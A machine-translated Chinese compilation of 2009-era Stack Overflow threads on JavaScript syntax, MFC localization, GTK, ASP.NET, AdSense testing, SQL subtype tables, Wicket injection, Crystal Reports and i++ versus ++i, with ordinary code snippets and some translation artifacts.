在不知道这个 sys.net.webrequest 是什么的情况下（我不是 ASP.Net Ajax 专家），无论如何，这就是您如何遍历字典的方式。

```
var headers = MyWebRequest.get_headers();
for(var key in headers) {
    if(headers.hasOwnProperty(key) {
        // here key is the name of the header, and headers[key] is it's value
    }
} 
```

# javascript - 'javascript:' 前缀何时是有效语法？

> ID：561550
> 
> 赞同：18
> 
> 时间：2009-02-18T15:35:44.813
> 
> 标签：javascript, syntax

我知道您可以在`<a>`标签中使用 javascript: 伪协议来处理 URL。但是，我注意到 Firefox 和 IE 都将允许 ' `javascript:`' 在标记内的 javascript 代码之前`<script>`。这是有效的语法吗？它会改变范围规则吗？

示例：我见过很多次：

```
<a onclick="javascript:alert('hello world!');">Hello World!</a> 
```

但是这种合法/有效的语法是否有什么特别之处：

```
<script type="text/javascript">
javascript:alert('hello world!');
</script> 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-02-18T15:57:17.087

在`href`属性之外（它是协议说明符），*name* : 只是创建[一个标签](https://developer.mozilla.org/En/Core_JavaScript_1.5_Reference/Statements/Label)（例如可能与 a `continue`or一起使用`break`）。

### 请参阅：[您是否需要在 onclick 中指定 javascript:？](https://stackoverflow.com/questions/372159/do-you-ever-need-to-specify-javascript-in-an-onclick)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-02-18T15:52:49.343

`javascript:`当您想将 JavaScript 放在`href`链接的属性中时，您需要“协议”。

```
<!-- does not work -->
<a href="alert('some text');">link</a>

<!-- does work -->
<a href="javascript:alert('some text');">link</a>

<!-- also works -->
<a href="#" onclick="alert('some text');">link</a> 
```

据我所知（如果我错了，请有人纠正我）范围没有区别，但是关于`this`.

```
<!-- does not work -->
<a href="alert(this.href);">link</a>

<!-- alerts "undefined" -->
<a href="javascript:alert(this.href);">link</a>

<!-- works as expected, alerts "<url>#" -->
<a href="#" onclick="alert(this.href);">link</a> 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-02-18T15:56:47.930

需要考虑的一件事是，如果我们做类似的事情，我们的测试人员总是会叮嘱我们

```
 <a href='javascript:openwindowmethod("url");'> stuff </a> 
```

而不是

```
 <a href='url' onclick='return openwindowmethod(this.href);'> stuff </a> 
```

第一种方法仅在您单击它时才有效，但如果您按 shift 或 alt 单击它，或者右键单击并在新窗口中打开则无效。

第二种方法将支持所有这些，以及如果用户只是简单地单击链接，则能够按预期方式运行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-07-23T18:15:40.453

该`javascript:`语法可以在 URL 中的任何位置使用，并将以下字符串作为脚本执行。它是[HTML 规范的一部分，](https://html.spec.whatwg.org/multipage/browsing-the-web.html#javascript-protocol)目前所有主流浏览器都支持 AFAIK。

# visual-c++ - 使 MFC 应用程序国际化

> ID：561553
> 
> 赞同：3
> 
> 时间：2009-02-18T15:36:31.240
> 
> 标签：visual-c++, mfc, internationalization, visual-c++-6

我这里有几个大型 MFC 应用程序，将它们转换成任何其他格式是不可能的。我们正在向其他市场扩张，并希望使这些应用程序能够在其他语言和文化中运行。

到目前为止，我偶尔会找到关于如何处理 Visual C++ 版本 6 的参考资料，其中提到 MFC 的更高版本具有额外的相关功能。搜索 MSDN 为我提供了有关如何将应用程序转换为 Unicode 的说明，我们已经这样做了。我在 MSDN 上找不到任何关于如何在 Unicode 中使语言成为多语言的内容，只有一些使用 Google 的旧东西，以及一本关于使用 VC++6 国际化的书。（我们现在在 XP 和 Vista 上使用 Visual Studio 2008。）

我没有声称我的 Google-fu 的力量，并且很高兴被引导到我错过的东西。

使用VC++6的方法是否合理，还是应该使用以后的特性？

如果我应该在此之后使用功能，我在哪里可以找到对它们的参考？

除了设置语言环境、将所有字符串转换为资源以及以不同语言复制资源之外，我还有什么需要担心的吗？

我可以找到更多关于 .NET 国际化的信息，但我对 .NET 缺乏经验。我会发现哪些适用于 VC++ 和 MFC？

编辑：我在尝试将 Unicode 字符串放入字符串表资源时遇到了困难。（据我所知，Unicode 字符串需要使用文本编辑器以 L"0x0034" 形式输入到 .rc 文件中。我还没有找到资源编辑器的方法来做到这一点。）有什么提示吗？我可以使用 VC++ 和 MFC 在 VS2008 中使用任何其他资源吗？

编辑：微软论坛上的某个人建议我在记事本中打开有问题的 .rc 文件，并将其保存为 Unicode。不幸的是，这似乎并不能修复对话框，尽管字符串表似乎在日语中工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T17:09:28.880

除了翻译“字符串”来国际化应用程序之外，还有很多其他的事情。

您的大部分 UI 都需要更新以考虑不同的文本长度和语言方向（希伯来语、中文、阿拉伯语……）

有些图像还需要更改以适应不同的文化（不幸的是，我没有这样的例子），要么是形象不同，要么颜色不符合当地规范。

我们正在使用[appTranslator 之](http://www.apptranslator.com/)类的工具来帮助我们进行外观本地化（UI 重新格式化），并使用专业的技术翻译器来处理字符串。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T16:02:16.683

您还可以创建仅资源的 dll

有关详细信息，请参阅[如何为 MFC 应用程序创建本地化资源 DLL](http://support.microsoft.com/kb/198846)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T15:46:53.663

您可以使用以下方式国际化您的应用程序。

在您将应用程序转换为 unicode 后（您已经这样做了），所有字符串都应该从 String 表中加载。

1.  对于每种语言，您需要更改字符串表并编译

2.  另一种方法是维护一个 XML 文件，其中包含本地化格式的所有字符串。根据语言加载 xml 和字符串。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-22T16:25:18.017

这是我的一篇 CodeProject 文章，描述了从字符串表中提取字符串的非常“编码高效”的方法（可翻译文本所需）： http: [//www.codeproject.com/KB/string/stringtable.aspx](http://www.codeproject.com/KB/string/stringtable.aspx)

这是另一个帮助您的应用选择正确的 UI 语言的类。它还可以帮助您创建语言选择菜单： http: [//www.codeproject.com/KB/locale/LanguageMenu.aspx](http://www.codeproject.com/KB/locale/LanguageMenu.aspx)

Last but not least, appTranslator is a tool that helps you translate the UI of your app, detect what changes were made in resources since the last version, create translated exe or resource DLLs and much more: [http://www.apptranslator.com](http://www.apptranslator.com)

(Note: I'm the author of appTranslator.)

# gtk - 在 GTK+ 中使用 FileChooserButton

> ID：561563
> 
> 赞同：0
> 
> 时间：2009-02-18T15:37:34.340
> 
> 标签：gtk, pygtk

我正在努力找出如何正确使用文件选择器按钮。阅读参考手册`GtkFileChooserButton`，`GtkFileChooserDialog`到目前为止`GtkFileChooser`没有帮助。我已经尝试连接到未记录的信号*文件集*并从这里`GtkFileChooserButton`调用`get\_filename()`，但它的行为似乎非常不可靠。当用户单击按钮并选择一个文件时，到目前为止它工作正常。

但是，如果在单击同一个按钮（已经设置了文件名）之后，用户改变主意并关闭“打开文件”对话框`get\_filename()` `returns None`（[Python](https://www.python.org)类型，我使用 pygtk 编写），而文件仍然设置。更奇怪的是，如果我稍后从另一个信号处理程序中对该按钮调用 get_filename()，文件名将返回到用户之前设置的文件名。顺便说一句，只有关闭对话框似乎会导致问题，按“取消”就可以了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-18T15:49:12.113

***不清楚的问题：***

如果你的意思是如何区分一个有效的选择文件：如果你调用 Run 你会得到一个响应： `Gtk::RESPONSE_ACCEPT`如果用户选择了一个文件并接受了这个文件（点击确定）

所以只有在文件被接受时才获取文件名。

如果您的意思是如何重置文件路径：请参阅`gtk FileChooser -> set_ current_folder`（文件名）（不带空格）

# asp.net - ASP.NET 验证未在 JavaScript showModalDialog 调用中执行

> ID：561568
> 
> 赞同：2
> 
> 时间：2009-02-18T15:38:26.447
> 
> 标签：asp.net, javascript, validation, modalpopups, showmodaldialog

我目前使用 JavaScript .showModalDialog 函数从我的父页面打开一个弹出窗口。弹出窗口包含一些 ASP.NET 验证控件，当用户单击 ASP.NET 按钮提交表单时，这些控件不会显示。如果页面上出现错误，则不会显示验证消息，不会在服务器端更新记录并关闭弹出窗口。

（asp.net 验证控件不会阻止弹出窗口执行服务器回发）

以前有没有人经历过这种行为，有什么办法可以防止吗？

这是我的 showModalDialong 调用源代码：

```
function OpenChildWindow(id)
{
    var sFeatures = sFeatures="dialogHeight: 525px;";
    sFeatures += "dialogWidth: 900px;";
    sFeatures += "scroll: yes;";
    sFeatures += "status: no;";
    sFeatures += "resizeable: no;";

    var url = "MyPopUp.aspx?ID=" + id;
    var childName = "ChildForm";

    entryWindow = window.showModalDialog(url, childName, sFeatures);

    if (entryWindow == true)
    {
        window.document.getElementById("<%= btnUpdateParent.ClientID %>").click();
    }
} 
```

**注意：** 当弹出模式关闭时，“单击”一个 ASP.NET 按钮以更新父级上的 ASP.NET UpdatePanel，以显示对弹出窗口中修改的记录的更改。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T21:15:25.060

我认为这可能是由于模式对话框和回发的一个臭名昭著的问题。您可以尝试在使用 window.showModalDialog 打开的页面的 head 标记中添加以下内容

```
<base target="_self" /> 
```

# adsense - 当我在美国时，如何测试针对加拿大的 Google Adsense？

> ID：561569
> 
> 赞同：1
> 
> 时间：2009-02-18T15:38:27.663
> 
> 标签：adsense

我正在为我们的网络设置定位，并希望加拿大客户有特定的目标广告，谷歌基于 IP 地址。

但是，我在美国，不知道如何测试。

有人知道解决方案吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-18T15:53:14.630

## AdSense 预览工具

要测试针对您当前区域之外的地理区域的 AdSense 广告，您需要下载并安装[AdSense 预览工具](https://www.google.com/adsense/support/bin/answer.py?answer=10005&topic=160)（它实际上是一个注册表设置。我相信您还需要安装 Google 工具栏）。

*   [Google AdSense 预览工具](https://www.google.com/adsense/support/bin/answer.py?answer=10005&topic=160)

有关预览工具的信息*（包括如何预览针对其他地理区域的广告）*可在此处找到： [https ://www.google.com/adsense/support/bin/topic.py?topic=160](https://www.google.com/adsense/support/bin/topic.py?topic=160 "Google Adsense 预览工具")

**一些基于 Web 的第三方工具：**

*   [AdSense 沙盒 1.0](http://www.labnol.org/google-adsense-sandbox/)
*   [Khrido AdSense 工具](http://tools.khrido.com/webtools/google-adsense-preview.aspx)

* * *

## AdWords 预览工具

要预览针对其他地理区域的 AdWords 广告，请登录您的 Google Adwords 帐户 (adwords.goolge.com)，然后执行以下操作：

**工具 > 广告预览工具**

输入您的**关键字**，选择**Google.ca**作为您的域，Country 作为**Canada**，然后单击**Preview Ad**按钮。

这是您可以使用的直接网址（这是用于搜索查询“Stack Overflow”）： [http ://www.google.com/search?ie=UTF-8&oe=UTF-8&hl=en&host=google.ca&q=stack %20溢出&adtest=on&gl=CA&gr=&gcs=](http://www.google.com/search?ie=UTF-8&oe=UTF-8&hl=en&host=google.ca&q=stack%20overflow&adtest=on&gl=CA&gr=&gcs=)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T15:43:49.553

也许您可以尝试寻找位于加拿大的代理服务器。

代理服务器，是您连接到的服务器。它位于您和您想要访问的任何网站之间。因此，当说 Google 收到请求时，它会看到代理的 IP（即加拿大），而不是您的美国 IP 地址。

我找到了这个网站，但我还没有测试过，但如果你愿意，可以试试： [免费加拿大代理](http://www.freeproxy.ca/)。他们有三个[加拿大代理人](http://www.freeproxy.ca/Filter~38~~.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T15:43:08.713

如果该站点在您的网络之外可用，则可以[免费代理查看该站点。](http://www.google.co.uk/search?hl=en&q=free+proxy)只需将您的浏览器代理设置为加拿大代理即可。如果你已经在代理后面，那会很痛苦。

**更新：**事实上，该名单上有一个[加拿大的](http://www.freeproxy.ca/)#3！

# javascript - 此 DIV 未在 Internet Explorer 上显示

> ID：561573
> 
> 赞同：0
> 
> 时间：2009-02-18T15:39:41.187
> 
> 标签：javascript, internet-explorer, dom, html

我需要做一些警报消息（如验证等），我正在用 DIV 做这件事。

这就是我进行验证的方式：

```
<form action="index.php" method="post" onsubmit="return validateSearchKeyword();">
        <input class="text_search" id="text_search" name="text_search" type="text" value="pesquisar" onfocus="if (this.value=='pesquisar') this.value = ''" onBlur="if (this.value=='') this.value = 'pesquisar'"  />
    </form> 
```

和验证功能：

```
function validateSearchKeyword()
{
if (document.getElementById('text_search').value==""){creatediv('divAvisoPesquisa','You must supply a value', '355px', '125px');return false;}
} 
```

这是创建 DIV 的函数：

```
function creatediv(id, html, left, top) {

if (document.getElementById(id)) 
    {
        //document.getElementById(id).style.display='block';
        //fadeIn(id, 300);
    }
    else
    {
        var newdiv = document.createElement('div');
        newdiv.setAttribute('id', id);
        newdiv.setAttribute("class", "warningDiv"); 
        newdiv.style.position = "absolute";
        newdiv.innerHTML = html;
        newdiv.style.left = left;
        newdiv.style.top = top;
        newdiv.style.display = "none";
        newdiv.onclick=function(e) {
            $(this).fadeOut(300, function() { $(this).remove(); });
        };  
        document.body.appendChild(newdiv);
        $("#"+id).fadeIn(300); 
    }
} 
```

fadIn和*fadeOut*函数来自“jquery-1.3.1.min.js *”*

 *CSS...

```
.warningDiv{
    -moz-border-radius-bottomleft:15px;
    -moz-border-radius-bottomright:15px;
    -moz-border-radius-topleft:15px;
    -moz-border-radius-topright:15px;
    font-size:11px;
    font-weight:bold;
    height:55px;
    padding:15px 25px;
    width:320px;
    z-index:100000;
    display: block;
} 
```

因此，这适用于所有浏览器，除了 Internet Explorer。即使验证有效（未通过验证时不提交表单），但未显示 DIV。我该如何解决这个问题？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T16:21:40.913

我想我明白了。如果您使用以下方法，IE 似乎不会以正确的方式应用类：

```
 newdiv.setAttribute("class", "warningDiv"); 
```

尝试改用这个：

```
 newdiv.className="warningDiv"; 
```

...我刚刚测试过，它在 IE 开发人员工具栏中显示了所有正确的 CSS 属性，而使用前者却没有这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T15:59:44.367

我几乎可以肯定 JQuery`.fadeIn`不能在 IE6 上运行。

在没有淡入淡出效果的情况下尝试您的功能或将效果调用更改为：

`$("#"+id).fadeIn(300,function() { $(this).show(); });`

# sql - SQL数据库表中的多态性？

> ID：561576
> 
> 赞同：23
> 
> 时间：2009-02-18T15:39:58.580
> 
> 标签：sql, postgresql, database-normalization

我目前在我的数据库中有多个表，它们包含相同的“基本字段”，例如：

```
name character varying(100),
description text,
url character varying(255)
```

但是我对该基本表有多个专业化，例如`tv_series`具有字段`season`, `episode`, `airing`, 而`movies`表具有`release_date`等`budget`。

现在起初这不是问题，但我想创建第二个表，`linkgroups`用这些专用表的外键调用。这意味着我必须以某种方式在其内部对其进行规范化。

我听说过解决这个问题的一种方法是使用`key-value`-pair-table 对其进行规范化，但我不喜欢这个想法，因为它是一种“数据库中的数据库”方案，我没有办法需要某些键/字段也不需要特殊类型，以后获取和排序数据将是一个巨大的痛苦。

所以我现在正在寻找一种在多个表之间“共享”主键甚至更好的方法：一种通过拥有一个通用表和多个专用表来规范化它的方法。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-02-18T17:18:08.530

对，问题是您只希望一种子类型的一个对象引用父类的任何给定行。从@Jay S 给出的[示例开始，试试这个：](https://stackoverflow.com/questions/561576/polymorphism-in-sql-database-tables/561627#561627)

```
create table media_types (
  media_type     int primary key,
  media_name     varchar(20)
);
insert into media_types (media_type, media_name) values
  (2, 'TV series'),
  (3, 'movie');

create table media (
  media_id       int not null,
  media_type     not null,
  name           varchar(100),
  description    text,
  url            varchar(255),
  primary key (media_id),
  unique key (media_id, media_type),
  foreign key (media_type) 
    references media_types (media_type)
);

create table tv_series (
  media_id       int primary key,
  media_type     int check (media_type = 2),
  season         int,
  episode        int,
  airing         date,
  foreign key (media_id, media_type) 
    references media (media_id, media_type)
);

create table movies (
  media_id       int primary key,
  media_type     int check (media_type = 3),
  release_date   date,
  budget         numeric(9,2),
  foreign key (media_id, media_type) 
    references media (media_id, media_type)
); 
```

这是@mike g[提到](https://stackoverflow.com/questions/561576/polymorphism-in-sql-database-tables/561960#561960)的不相交子类型的一个示例。

* * *

回复@Countably Infinite 和@Peter 的评论：

插入两个表需要两个插入语句。但是，只要您有子表，在 SQL 中也是如此。这是一件很平常的事情。

UPDATE 可能需要两条语句，但某些品牌的 RDBMS 支持使用 JOIN 语法的多表 UPDATE，因此您可以在一条语句中完成。

查询数据时，`media`如果您只需要有关公共列的信息，则只需查询表即可：

```
SELECT name, url FROM media WHERE media_id = ? 
```

如果您知道您正在查询电影，则可以通过单个联接获取特定于电影的信息：

```
SELECT m.name, v.release_date
FROM media AS m
INNER JOIN movies AS v USING (media_id)
WHERE m.media_id = ? 
```

如果您想要给定媒体条目的信息，并且不知道它是什么类型，则必须加入所有子类型表，知道只有一个这样的子类型表会匹配：

```
SELECT m.name, t.episode, v.release_date
FROM media AS m
LEFT OUTER JOIN tv_series AS t USING (media_id)
LEFT OUTER JOIN movies AS v USING (media_id)
WHERE m.media_id = ? 
```

如果给定的媒体是电影，则其中的所有列都`t.*`将为 NULL。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-18T15:47:56.407

考虑使用一个主要的基本数据表，其中包含专门信息的表格。

前任。

```
basic_data
id int,
name character varying(100),
description text,
url character varying(255)

tv_series
id int,
BDID int, --foreign key to basic_data
season,
episode
airing

movies
id int,
BDID int, --foreign key to basic_data
release_data
budget 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-18T23:06:26.197

由于您标记了此 PostgreSQL，您可以查看[http://www.postgresql.org/docs/8.1/static/ddl-inherit.html](http://www.postgresql.org/docs/8.1/static/ddl-inherit.html)但要注意警告。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T17:03:27.753

您正在寻找的东西在关系世界中被称为“不相交的子类型”。它们在语言级别的 sql 中不受支持，但可以或多或少[地在 sql 之上实现](http://blogs.conchango.com/davidportas/archive/2007/01/08/Distributed-Keys-and-Disjoint-Subtypes.aspx)。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-18T15:44:56.977

您可以创建一个包含主要字段和一个 uid 的表，然后为每个特定情况创建具有相同 uid 的扩展表。要像单独的表一样查询这些，您可以创建视图。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2010-05-13T00:51:36.317

使用 Bill Karwin 建议的不相交子类型方法，您将如何执行 INSERT 和 UPDATE 而无需分两步执行？

获取数据，我可以引入一个基于特定 media_type 连接和选择的视图，但是我无法更新或插入该视图，因为它会影响多个表（我在这里说的是 MS SQL Server）。这可以在不进行两次操作的情况下完成吗 - 自然也不需要存储过程。

谢谢

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-05-05T13:10:21.263

问题已经很老了，但对于现代 postresql 版本，也值得考虑使用 json/jsonb/hstore 类型。例如：

```
create table some_table (
    name character varying(100),
    description text,
    url character varying(255),
    additional_data json
); 
```

# java - Wicket 依赖注入

> ID：561578
> 
> 赞同：4
> 
> 时间：2009-02-18T15:40:21.277
> 
> 标签：java, dependency-injection, wicket, guice

我在 Wicket 中有一个包含表单的页面，该表单需要合作者才能完成工作。协作者被注入（我正在使用 Guice）并且看起来像：

```
public class RegistrationPage extends WebPage {
    @Inject
    public RegistrationPage(RegistrationService service) {
        this.service = service;
        add(new RegistrationForm());            
    }

    private class RegistrationForm extends Form {
        public RegistrationForm() {
            // setup
        }

        protected void onSubmit() {
           service.doSomething();
        }
    }
} 
```

我不喜欢将 RegistrationService 注入到 RegistrationPage 中的想法，而只有 RegistrationForm 需要它。我可以更改 RegistrationForm 以接收 RegistrationService：

```
public RegistrationForm(RegistrationService service) {
    this.service = service;
} 
```

并从 RegistrationPage 中删除该字段，但 RegistrationPage 仍用于传递。

我想我要问的是这样做的最佳做法是什么？这样做可以吗，或者将 RegistrationForm 本身注入页面可能会更好：

```
 public class RegistrationPage extends WebPage {
        @Inject
        public RegistrationPage(RegistrationForm form) {
            add(form);
        }
   }

   ---

   private class RegistrationForm extends Form {
        private RegistrationService service;

        @Inject
        public RegistrationForm(RegistrationService service) {
            this.service = service;
        }

        protected void onSubmit() {
           service.doSomething();
        }
    } 
```

我更喜欢这个，因为我希望将 RegistrationForm 放在单独的类/文件中。我对 Wicket 很陌生，所以不确定规范是什么——有人可以给我指路明灯吗？:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-19T21:20:46.337

wicket+ioc 的基本范式是：大多数依赖项应该通过 setter 注入来注入。对于网页，构造函数注入是不可能的。

组件/面板/表单/页面应该只在接收端。

因此，将依赖项`RegistrationService`愉快地注入到 中`RegistrationForm`，然后在 RegistrationPage 中使用 add(new RegistrationForm()); 创建它

wicket 有 IComponentInstantiationListener - 其中之一是 guice。他们在每个组件/网页的构造函数中得到通知。因此，您的 RegistrationForm 将在代码的任何部分执行之前注入其依赖项。

我会这样做的方式：（当然RegistrationForm可以在另一个文件中）

```
public class RegistrationPage extends WebPage {

@Inject
public RegistrationPage() {
    add(new RegistrationForm());            
}

---
private static class RegistrationForm extends Form {
   RegistrationService service;

      @Inject
     public void setRegistrationService (RegistrationService  service){
     this.service = service;
        }
    public RegistrationForm() {
        // setup
    }

    protected void onSubmit() {
       service.doSomething();
    }
}
} 
```

如果您决定将 RegistrationForm 作为内部类放在 Page 中，请记住将其声明为静态！您很可能不需要对封闭类的任何引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-03T16:14:45.073

在我看来，Wicket 上的 DI 有一个令人困惑的元素，它是在组件或页面上自动完成的，而不是在模型中。在我看来，模型（但不是页面）应该依赖于 JPA 等。

官方文档说要使用`InjectorHolder.getInjector().inject(this)`

# c# - 在后面的页面中包含类库，C# ASP.Net

> ID：561581
> 
> 赞同：0
> 
> 时间：2009-02-18T15:41:10.073
> 
> 标签：c#, asp.net, class

在我们受限的系统上工作意味着我不能将类库放到 app_bin/bin/App_Code 基本上任何普通文件夹中，所以我目前正在链接到我的类库，如下所示......

```
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="~/cs/codebehind.cs" Inherits="codebehind"  %>
<%@ Assembly Src="~/cs/mycodelibrary.cs" %> 
```

我要解决的问题是如何将类库作为代码隐藏中的文件引用，因此我不需要在页面上添加其他内容，并且 VS 停止告诉我程序集中的内容不存在.

IE

```
using "~/cs/regionalPages.cs" 
```

* * *

快速添加，如上所述添加 mycodelibrary.cs 确实有效。我只是想找到更好的方法。

而且我应该重申**我无法访问普通的 .net 文件夹**，如果我这样做了，我就不会问这个看似愚蠢的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T15:52:50.920

所以。你错过了真正的服务器。

为什么不使用 App_Code 文件夹并让 ASP.NET 为您处理编译和引用路径？这就是它的用途。

**编辑**：嗯。您是说您无权访问 App_Code，但您有一个名为 cs 的文件夹，您可以在其中放置代码文件？这是一个非常奇怪的安排。首先限制您访问的人会怎么想？

我不明白的另一件事是你的 mycodelibrary.cs 将如何被编译。ASP.NET 在 App_Code 文件夹中处理编译，但不在其他地方（或者我错了吗？）。

**另一个编辑**：好的，我现在知道了，并且已经尝试过了。.aspx 页面中的`@Assembly`指令确保代码文件被编译，并且对它的引用可供页面使用。然后在代码隐藏中也可以使用该引用（即使使用智能感知），因为它是相同的（部分）类。

现在，您是否质疑如何在没有`@Assembly`.aspx 文件中的指令（而是代码隐藏中的某些内容）的情况下完成相同的事情？`using`我可以告诉你，至少没有任何形式的人能做到这一点。老实说，我看不出有什么办法可以做到这一点，抱歉。

Cerebrus 提到使用代码库配置运行时或在 Web.config 中进行探测，但这仅适用于已编译的程序集。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-18T15:49:05.530

首先，.cs 文件不是程序集。必须先将其编译为 DLL，然后才能将其视为程序集。

为了引用在页面级别导入的程序集中的代码，我相信您必须将服务器端代码与标记内联（而不是使用单独的 aspx.cs 文件）。

最好的祝福...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T16:11:09.830

DLL**可以**从您可能描述为“普通”文件夹的文件夹中加载。但是，您需要指示 ASP.NET 从指定文件夹加载程序集，例如，使用配置文件中的`codebase`或`probing`元素。

看看这篇[MSDN 文章](http://msdn.microsoft.com/en-us/library/4191fzwb(VS.80).aspx)，它解释了过程和语法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-11-09T12:09:20.047

干得好：

1.  首先创建一个新的用户控件：UC_TestingPOC.ascx，
2.  创建一个新的类库：UserControlsCodeBehind，
3.  在 Class Libray 下，为之前创建的用户控件添加类后面的代码：UC_TestingPOC.ascx.cs

在用户控件的顶部，添加以下行：

```
<%@ Assembly Name ="UserControlsCodeBehind, Version=1.0.0.0, Culture=neutral, PublicKeyToken=00000000000000" %>
<%@ Control Language="C#" AutoEventWireup="true" Inherits="UserControlsCodeBehind.UC_TestingPOC" %> 
```

# c# - 如何删除 Crystal Report Viewer 中的主选项卡？

> ID：561586
> 
> 赞同：4
> 
> 时间：2009-02-18T15:41:53.270
> 
> 标签：c#, crystal-reports

如何在 Crystal Report Viewer (C#) 中删除或隐藏主选项卡部分。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2010-05-03T21:44:31.750

Omid 的回答是正确的，但您必须确保**在设置查看器的 ReportSource 后**执行这些操作。下面我的函数中的版本更加健壮，并且使正在发生的事情更加清晰，尽管我仍然不确定为什么对 TabControl 的 ItemSize 和 SizeMode 做一些魔法会使标签栏消失。

```
// This is a method of a Form with one of these:
//     CrystalDecisions.Windows.Forms.CrystalReportViewer
// This hides the tab control with the "Main Report" button.
public void hideTheTabControl()
{
    System.Diagnostics.Debug.Assert(
        crystalReportViewer1.ReportSource != null, 
        "you have to set the ReportSource first");

    foreach (Control c1 in crystalReportViewer1.Controls)
    {
        if (c1 is CrystalDecisions.Windows.Forms.PageView)
        {
            PageView pv = (PageView)c1;
            foreach (Control c2 in pv.Controls)
            {
                if (c2 is TabControl)
                {
                    TabControl tc = (TabControl)c2;
                    tc.ItemSize = new Size(0, 1);
                    tc.SizeMode = TabSizeMode.Fixed;
                }
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2010-06-01T20:19:44.687

谢谢。

在 VB 中应该是这样的：

```
 For Each c1 As Control In CrystalReportViewer1.Controls
        If c1.GetType Is GetType(CrystalDecisions.Windows.Forms.PageView) Then
            Dim pv As CrystalDecisions.Windows.Forms.PageView = c1
            For Each c2 As Control In pv.Controls
                If c2.GetType Is GetType(TabControl) Then
                    Dim tc As TabControl = c2
                    tc.ItemSize = New Size(0, 1)
                    tc.SizeMode = TabSizeMode.Fixed
                End If
            Next
        End If
    Next 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-10-18T14:05:00.503

## CrystalDecisions.Web ReportViewer 解决方案

在页面中引用`jquery.js`并粘贴此脚本：

```
<script type="text/javascript">
$(document).ready(function () {
    $(".hideableFrame").hide();
}); 
```

## 解释

我发现*“主选项卡”*放在一个`<tr>`里面`class="hideableFrame"`

```
<tr class="hideableFrame" valign="bottom" height="28" style="display: table-row;">
 <td>
   <img width="5" height="5" 
    ... 
```

我不能在`css`文件中工作，因为`style:display`它是写在元素上的，所以我写了一个脚本来改变标记为的项目的可见性`hideableFrame`。

注意：有 4 个 -USELESS- 元素和`class="hideableFrame"`; 这个脚本将隐藏所有这些。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-16T06:50:02.327

我尝试了 Emanuele Greco 的解决方案，它可以工作，但有时无法在代码中添加对 jquery 的引用。在你的网页上试试这个

```
<CR:CrystalReportViewer ID="CrystalReportViewer1" 
                runat="server"
                CssClass="Report"
                 HasCrystalLogo="False" 
                 HasSearchButton="False"
                  HasToggleGroupTreeButton="False" 
                   HasZoomFactorList="False" 
                  Height="100%" Width="100%" 
                  meta:resourcekey="CrystalReportViewer1Resource1"
                  EnableDrillDown="False" 
                  ReuseParameterValuesOnRefresh="True" 
                  EnableToolTips="False" ToolPanelView="None" HasDrilldownTabs="False" 
                    HasDrillUpButton="False" /> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-08-24T20:54:47.907

```
 foreach (Control control in crystalReportViewer1.Controls)
            {

                if (control is CrystalDecisions.Windows.Forms.PageView)
                {

                    TabControl tab = (TabControl)(CrystalDecisions.Windows.Forms.PageView)control).Controls[0];

                    tab.ItemSize = new Size(0, 1);

                    tab.SizeMode = TabSizeMode.Fixed;

                    tab.Appearance = TabAppearance.Buttons;

                }

            } 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-01-03T14:00:45.377

在 CrystalReportViewer 控件中设置 HasDrilldownTabs="false"

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2009-12-11T13:11:05.963

crystalReportViewer1.DisplayStatusBar = false;

# java - 哪个更有效，i++ 还是 ++i？

> ID：561588
> 
> 赞同：15
> 
> 时间：2009-02-18T15:42:42.723
> 
> 标签：java, c++, performance, post-increment, pre-increment

**完全重复**：[C++ 中的 i++ 和 ++i 之间是否存在性能差异？](https://stackoverflow.com/questions/24901/)
**完全重复**：[循环中 i++ 和 ++i 之间的区别？](https://stackoverflow.com/questions/484462/)

* * *

哪个更有效，i++ 还是 ++i？

我只在 Java 和 C/C++ 中使用过它，但我真的要求所有实现它的语言。

在大学时，我有一位教授向我们展示了 ++i 更高效，但已经有几年了，我想从 Stack Overflow 社区获得意见。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2009-02-18T15:46:18.143

我++：

*   创建 i 的临时副本
*   增加 i
*   返回临时副本

++我：

*   增加 i
*   返回我

通过优化，生成的程序集很可能是相同的，但是 ++i 更有效。

编辑：请记住，在 C++ 中，我可能是支持前缀和后缀 ++ 运算符的任何对象。对于复杂的对象，临时复制成本是不可忽略的。

* * *

## 回答 #2

> 赞同：37
> 
> 时间：2009-02-18T15:45:35.977

我会在别处寻找优化潜力。

* * *

